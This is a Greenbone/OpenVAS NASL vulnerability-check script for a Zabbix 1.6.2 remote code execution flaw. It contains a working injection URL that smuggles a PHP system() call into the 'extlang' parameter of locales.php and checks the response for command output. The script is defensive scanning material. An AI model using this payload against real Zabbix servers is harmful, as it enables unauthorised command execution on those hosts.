CPE = "cpe:/a:zabbix:zabbix";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103581" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "9.7" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:C/A:C" );
	script_name( "ZABBIX 'locales.php' 'extlang' Parameter Remote Code Execution" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-10-02 10:27:14 +0200 (Tue, 02 Oct 2012)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "zabbix_web_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "Zabbix/Web/installed" );
	script_xref( name: "URL", value: "http://www.zabbix.com/" );
	script_xref( name: "URL", value: "http://www.ush.it/team/ush/hack-zabbix_162/adv.txt" );
	script_tag( name: "summary", value: "ZABBIX is prone to a Remote Code Execution." );
	script_tag( name: "impact", value: "Input passed to the 'extlang' parameter in 'locales.php' is not properly
  sanitised before being used to process data. This can be exploited to execute
  arbitrary commands via specially crafted requests." );
	script_tag( name: "affected", value: "ZABBIX 1.6.2 and possibly earlier versions are vulnerable." );
	script_tag( name: "solution", value: "Updates are available. Please see the references for more information." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
commands = exploit_commands();
for cmd in keys( commands ) {
	url = dir + "/locales.php?download=1&langTo=1&extlang[%22.system(%27" + commands[cmd] + "%27).%22]=1";
	if(http_vuln_check( port: port, url: url, pattern: cmd )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

